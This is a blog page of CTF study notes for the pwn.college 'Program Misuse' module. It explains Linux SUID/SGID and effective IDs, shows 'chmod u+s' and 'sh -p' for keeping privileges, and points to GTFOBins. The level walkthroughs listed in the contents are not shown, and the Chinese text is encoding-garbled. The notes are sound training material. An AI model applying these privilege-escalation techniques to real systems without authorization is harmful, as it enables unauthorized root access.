<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>pwnCollege1-ProgramMiuse | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"NpcÂ∞èÁ´ô","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="LectureNotes  Privilege Escalation  Every process has a user ID (UID) and and a group ID (GID)  UID 0: the Linux admin user (root). Needed for:  Installing software Loading device drivers Shutting do">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnCollege1-ProgramMiuse">
<meta property="og:url" content="http://npc0vo.github.io/2024/05/09/PwnCollege1-ProgramMiuse/index.html">
<meta property="og:site_name" content="Npc | Blog">
<meta property="og:description" content="LectureNotes  Privilege Escalation  Every process has a user ID (UID) and and a group ID (GID)  UID 0: the Linux admin user (root). Needed for:  Installing software Loading device drivers Shutting do">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-05-09T11:36:57.000Z">
<meta property="article:modified_time" content="2024-06-07T15:48:21.231Z">
<meta property="article:author" content="Npc">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">üò≠</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">ÂèàÊ¥ª‰∫Ü‰∏ÄÂ§©</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">80</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ÁïôË®ÄÊùø"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/npc0vo" title="Yuque" target="_blank" style="color:#a0c69d"><span class="icon iconify" data-icon="ri:yuque-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="ÊàëÁöÑÂ∞è‰ºô‰º¥‰ª¨" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lecturenotes"><span class="toc-number">1.</span> <span class="toc-text"> LectureNotes</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#privilege-escalation"><span class="toc-number">1.1.</span> <span class="toc-text"> Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-permission-model"><span class="toc-number">1.1.1.</span> <span class="toc-text"> Linux Permission Model:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#useful-commands"><span class="toc-number">1.1.2.</span> <span class="toc-text"> Useful Commands:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sources"><span class="toc-number">1.2.</span> <span class="toc-text"> Sources:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fundamentals"><span class="toc-number">2.</span> <span class="toc-text"> Fundamentals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pragram-misuse"><span class="toc-number">2.1.</span> <span class="toc-text"> Pragram Misuse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1cat"><span class="toc-number">2.1.1.</span> <span class="toc-text"> level1(cat)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2more"><span class="toc-number">2.1.2.</span> <span class="toc-text"> level2(more)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3less"><span class="toc-number">2.1.3.</span> <span class="toc-text"> level3(less)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4tail"><span class="toc-number">2.1.4.</span> <span class="toc-text"> level4(tail)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5head"><span class="toc-number">2.1.5.</span> <span class="toc-text"> level5(head)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level6sort"><span class="toc-number">2.1.6.</span> <span class="toc-text"> level6(sort)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7vim"><span class="toc-number">2.1.7.</span> <span class="toc-text"> level7(vim)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level8emacs"><span class="toc-number">2.1.8.</span> <span class="toc-text"> level8(emacs)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level9nano"><span class="toc-number">2.1.9.</span> <span class="toc-text"> level9(nano)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level10rev"><span class="toc-number">2.1.10.</span> <span class="toc-text"> level10(rev)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level11od"><span class="toc-number">2.1.11.</span> <span class="toc-text"> level11(od)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level12hexdump"><span class="toc-number">2.1.12.</span> <span class="toc-text"> level12(hexdump)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level13xxd"><span class="toc-number">2.1.13.</span> <span class="toc-text"> level13(xxd)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level14base32"><span class="toc-number">2.1.14.</span> <span class="toc-text"> level14(base32)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level15base64"><span class="toc-number">2.1.15.</span> <span class="toc-text"> level15(base64)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level16split"><span class="toc-number">2.1.16.</span> <span class="toc-text"> level16(split)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level17-gzip"><span class="toc-number">2.1.17.</span> <span class="toc-text"> level17 (gzip)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level18bzip2"><span class="toc-number">2.1.18.</span> <span class="toc-text"> level18(bzip2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level19zip"><span class="toc-number">2.1.19.</span> <span class="toc-text"> level19(zip)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level20tar"><span class="toc-number">2.1.20.</span> <span class="toc-text"> level20(tar)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level21ar"><span class="toc-number">2.1.21.</span> <span class="toc-text"> level21(ar)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.21.1.</span> <span class="toc-text"> ËØ≠Ê≥ï</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.21.1.1.</span> <span class="toc-text"> ÂèÇÊï∞Ôºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BF%85%E8%A6%81%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.21.1.2.</span> <span class="toc-text"> ÂøÖË¶ÅÂèÇÊï∞Ôºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%89%E9%A1%B9%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.21.1.3.</span> <span class="toc-text"> ÈÄâÈ°πÂèÇÊï∞Ôºö</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level22cpio"><span class="toc-number">2.1.22.</span> <span class="toc-text"> level22(cpio)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95-2"><span class="toc-number">2.1.22.1.</span> <span class="toc-text"> ËØ≠Ê≥ï</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0-2"><span class="toc-number">2.1.22.1.1.</span> <span class="toc-text"> ÂèÇÊï∞Ôºö</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wp"><span class="toc-number">2.1.22.2.</span> <span class="toc-text"> wp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level23genisoimage"><span class="toc-number">2.1.23.</span> <span class="toc-text"> level23(genisoimage)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level24env"><span class="toc-number">2.1.24.</span> <span class="toc-text"> level24(env)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level25find"><span class="toc-number">2.1.25.</span> <span class="toc-text"> level25(find)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level26make"><span class="toc-number">2.1.26.</span> <span class="toc-text"> level26(make)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level27nice"><span class="toc-number">2.1.27.</span> <span class="toc-text"> level27(nice)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level28timeout"><span class="toc-number">2.1.28.</span> <span class="toc-text"> level28(timeout)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level29stdbuf"><span class="toc-number">2.1.29.</span> <span class="toc-text"> level29(stdbuf)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level30setarch"><span class="toc-number">2.1.30.</span> <span class="toc-text"> level30(setarch)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level31watch"><span class="toc-number">2.1.31.</span> <span class="toc-text"> level31(watch)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level32socat"><span class="toc-number">2.1.32.</span> <span class="toc-text"> level32(socat)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level33whiptail"><span class="toc-number">2.1.33.</span> <span class="toc-text"> level33(whiptail)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level34awk"><span class="toc-number">2.1.34.</span> <span class="toc-text"> level34(awk)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.34.1.</span> <span class="toc-text"> Âü∫Êú¨ËØ≠Ê≥ï</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%80%89%E9%A1%B9"><span class="toc-number">2.1.34.2.</span> <span class="toc-text"> Â∏∏ËßÅÈÄâÈ°π</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.34.3.</span> <span class="toc-text"> Â∏∏ËßÅÁî®Ê≥ïÁ§∫‰æã</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%8C%87%E5%AE%9A%E5%88%97"><span class="toc-number">2.1.34.3.1.</span> <span class="toc-text"> ÊâìÂç∞ÊåáÂÆöÂàóÔºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%9D%A1%E4%BB%B6%E7%AD%9B%E9%80%89%E8%A1%8C"><span class="toc-number">2.1.34.3.2.</span> <span class="toc-text"> Ê†πÊçÆÊù°‰ª∂Á≠õÈÄâË°åÔºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%9F%E8%AE%A1%E8%A1%8C%E6%95%B0"><span class="toc-number">2.1.34.3.3.</span> <span class="toc-text"> ÁªüËÆ°Ë°åÊï∞Ôºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%88%97%E7%9A%84%E6%80%BB%E5%92%8C"><span class="toc-number">2.1.34.3.4.</span> <span class="toc-text"> ËÆ°ÁÆóÂàóÁöÑÊÄªÂíåÔºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%AD%97%E6%AE%B5%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">2.1.34.3.5.</span> <span class="toc-text"> ÊåáÂÆöÂ≠óÊÆµÂàÜÈöîÁ¨¶Ôºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-awk-%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.34.3.6.</span> <span class="toc-text"> ‰ΩøÁî® awk ËÑöÊú¨Êñá‰ª∂Ôºö</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.34.3.7.</span> <span class="toc-text"> ÂÆö‰πâÂèòÈáèÔºö</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level35sed"><span class="toc-number">2.1.35.</span> <span class="toc-text"> level35(sed)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level36ed"><span class="toc-number">2.1.36.</span> <span class="toc-text"> level36(ed)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level37chown"><span class="toc-number">2.1.37.</span> <span class="toc-text"> level37(chown)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level38chmod"><span class="toc-number">2.1.38.</span> <span class="toc-text"> level38(chmod)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level39cp"><span class="toc-number">2.1.39.</span> <span class="toc-text"> level39(cp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level40mv"><span class="toc-number">2.1.40.</span> <span class="toc-text"> level40(mv)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level41perl"><span class="toc-number">2.1.41.</span> <span class="toc-text"> level41(perl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level42python"><span class="toc-number">2.1.42.</span> <span class="toc-text"> level42(python)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level43ruby"><span class="toc-number">2.1.43.</span> <span class="toc-text"> level43(ruby)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level44bash"><span class="toc-number">2.1.44.</span> <span class="toc-text"> level44(bash)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level45date"><span class="toc-number">2.1.45.</span> <span class="toc-text"> level45(date)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level46dmesg"><span class="toc-number">2.1.46.</span> <span class="toc-text"> level46(dmesg)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level47wc"><span class="toc-number">2.1.47.</span> <span class="toc-text"> level47(wc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level48gcc"><span class="toc-number">2.1.48.</span> <span class="toc-text"> level48(gcc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level49as"><span class="toc-number">2.1.49.</span> <span class="toc-text"> level49(as)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level50wget"><span class="toc-number">2.1.50.</span> <span class="toc-text"> level50(wget)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.50.1.</span> <span class="toc-text"> Â∏∏Áî®ÂëΩ‰ª§Ôºö</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.50.2.</span> <span class="toc-text"> Â∏∏Áî®ÂèÇÊï∞Ôºö</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level51ssh-keygen"><span class="toc-number">2.1.51.</span> <span class="toc-text"> level51(ssh-keygen)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.1.52.</span> <span class="toc-text"> ÊÄªÁªìÔºö</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/05/09/PwnCollege1-ProgramMiuse/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">pwnCollege1-ProgramMiuse</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-05-09 19:36:57" itemprop="dateCreated datePublished" datetime="2024-05-09T19:36:57+08:00">2024-05-09</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-06-07 23:48:21" itemprop="dateModified" datetime="2024-06-07T23:48:21+08:00">2024-06-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">15.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">64m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/PwnCollege/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">PwnCollege</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTF</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="lecturenotes"><a class="markdownIt-Anchor" href="#lecturenotes"></a> LectureNotes</h1>
<h2 id="privilege-escalation"><a class="markdownIt-Anchor" href="#privilege-escalation"></a> Privilege Escalation</h2>
<ul>
<li>Every process has a user ID (UID) and and a group ID (GID)
<ul>
<li>UID 0: the Linux admin user (root). Needed for:
<ul>
<li>Installing software</li>
<li>Loading device drivers</li>
<li>Shutting down/rebooting</li>
<li>Changing system-wide settings</li>
<li>Can be used to:
<ul>
<li>open ANY file</li>
<li>execute any program</li>
<li>assume any other user/group ID</li>
<li>debug any program</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="linux-permission-model"><a class="markdownIt-Anchor" href="#linux-permission-model"></a> <strong>Linux Permission Model:</strong></h3>
<p>447</p>
<ul>
<li>SUID(Set User ID): execute with the eUID(effective user ID) of the file owner rather than the parent process
<ul>
<li>Reset every time a file‚Äôs ownership is changed</li>
</ul>
</li>
<li>SGID(Set Group ID): execute with the eGID(effective Group ID) of the file owner rather than the parent process</li>
<li>Sticky: used for shared directories to limit file removal to file owners
<ul>
<li>ensures you can only delete files you have created in a shared directory</li>
</ul>
</li>
<li>Effective ID(eUID/eGID): the UID/GID used for most access checks</li>
<li>Read ID(UID/GID):the ‚Äúreal‚Äù user/group ID of the process owner, used for things such as signal checks</li>
<li>Saved ID: a user/group ID that your process could switch its eUID/eGID to
<ul>
<li>Used for temporarily dropping privileges</li>
</ul>
</li>
</ul>
<h3 id="useful-commands"><a class="markdownIt-Anchor" href="#useful-commands"></a> Useful Commands:</h3>
<ul>
<li><code>id</code>: will list out the IDs of every process on your system</li>
<li><code>sudo chmod u+s fileName</code>: add the SUID for the given file</li>
<li><code>sh -p</code>: ensures that privileges are not dropped when running a program</li>
</ul>
<h2 id="sources"><a class="markdownIt-Anchor" href="#sources"></a> Sources:</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://pwn.college/modules/misuse">pwn.college Module 2 Lectures</a></li>
<li><a target="_blank" rel="noopener" href="https://dojo.pwn.college/challenges/misuse">pwn.college Module 2 Challenges</a></li>
<li><a target="_blank" rel="noopener" href="https://www.twitch.tv/pwncollege">pwn.college Class Twitch Streams</a></li>
</ul>
<h1 id="fundamentals"><a class="markdownIt-Anchor" href="#fundamentals"></a> Fundamentals</h1>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux ÂëΩ‰ª§Â§ßÂÖ® | ËèúÈ∏üÊïôÁ®ã (runoob.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://gnu-linux.readthedocs.io/zh/latest/Chapter01/00_man.html">man Êü•ÁúãÂ∏ÆÂä©ÊâãÂÜå ‚Äî Linux latest ÊñáÊ°£ (gnu-linux.readthedocs.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBinsËÆ∞ÂΩï‰∫ÜÂ∏∏ËßÅlinuxËΩØ‰ª∂ÁöÑÊèêÊùÉÊñπÂºè</a></p>
<p><code>Â≠¶Â•ΩEnglishÔºåËÉΩÁúãÊáÇmanÊñáÊ°£</code></p>
<p><s>Áúã‰∏çÊáÇÂïä</s></p>
<h2 id="pragram-misuse"><a class="markdownIt-Anchor" href="#pragram-misuse"></a> Pragram Misuse</h2>
<p>This challenge is part of a series of programs that<br />
exposes you to very simple programs that let you directly read the flag.</p>
<p>‚ÄúSUID‚Äù ÊåáÁöÑÊòØ ‚ÄúSet User ID‚ÄùÔºåÊòØ Unix ÂíåÁ±ª Unix Á≥ªÁªü‰∏äÁöÑ‰∏ÄÁßçÊùÉÈôê‰Ωç„ÄÇÂΩì‰∏Ä‰∏™ÂèØÊâßË°åÊñá‰ª∂Êã•Êúâ SUID ÊùÉÈôêÊó∂ÔºåÂΩìÁî®Êà∑ÊâßË°åËØ•Êñá‰ª∂Êó∂ÔºåËØ•Êñá‰ª∂ÁöÑÊâÄÊúâËÄÖÁöÑÁî®Êà∑ ID Â∞Ü‰ºöË¢´ËÆæÁΩÆ‰∏∫ËøõÁ®ãÁöÑÊúâÊïàÁî®Êà∑ IDÔºåËÄå‰∏çÊòØÊâßË°åËØ•Êñá‰ª∂ÁöÑÁî®Êà∑ÁöÑÁî®Êà∑ ID„ÄÇËøô‰ΩøÂæóËØ•ËøõÁ®ã‰ª•Êñá‰ª∂ÊâÄÊúâËÄÖÁöÑÊùÉÈôêÊù•ÊâßË°åÔºåËÄå‰∏çÊòØÊâßË°åËØ•Êñá‰ª∂ÁöÑÁî®Êà∑ÁöÑÊùÉÈôê„ÄÇ</p>
